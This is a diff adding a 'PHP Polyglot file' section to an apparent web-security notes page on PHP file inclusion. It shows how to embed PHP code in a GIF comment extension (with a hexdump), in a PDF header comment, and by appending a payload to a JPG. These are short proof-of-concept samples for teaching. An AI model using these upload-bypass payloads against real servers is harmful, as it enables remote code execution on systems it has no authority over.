@@ -160,6 +160,8 @@
     
         <li><a class="" href="#php-session-files">PHP session files</a></li>
     
+        <li><a class="" href="#php-polyglot-file">PHP Polyglot file</a></li>
+    
     </ul>
     
 
@@ -393,6 +395,29 @@ to create a use with a username that contains some PHP code. Then he includes
 the session file with a LFI.</p>
 </li>
 </ul>
+<h2 id="php-polyglot-file">PHP Polyglot file</h2>
+<p>A polyglot file is valid in two different format. For instance a valid <code>GIF</code>
+file that contains a PHP payload.</p>
+<h3 id="gif89">GIF89</h3>
+<p><a href="../assets/polyglot.php.gif">This file</a>) contains a PHP payload in the <a href="https://www.w3.org/Graphics/GIF/spec-gif89a.txt" target="_blank">Comment
+Extension</a> of a 1 pixel GIF:</p>
+<pre><code class="language-bash line-numbers">hexdump -C assets/polyglot.php.gif
+00000000  47 49 46 38 39 61 01 00  01 00 00 ff 00 2c 00 00  |GIF89a.......,..|
+00000010  00 00 01 00 01 00 00 02  00 21 fe 3c 3f 70 68 70  |.........!.&lt;?php|
+00000020  69 6e 66 6f 28 29 3b                              |info();|
+</code></pre>
+
+<h3 id="pdf">PDF</h3>
+<p>You can add a comment (<code>%</code>) on the PDF header:</p>
+<pre><code class="language-pdf line-numbers">%PDF-1.2 %&lt;?phpinfo()?&gt;
+...
+</code></pre>
+
+<h3 id="others-formats">Others formats</h3>
+<p>On most formats (mp3, jpg, ...) there is an <code>EOF</code> after what we can add the
+payload. So the easiest way is to append to a valid file our payload:</p>
+<pre><code class="language-bash line-numbers">cat valid.jpg payload.php &gt; polyglot.php.jpg
+</code></pre>
             
           </div>
           <footer>
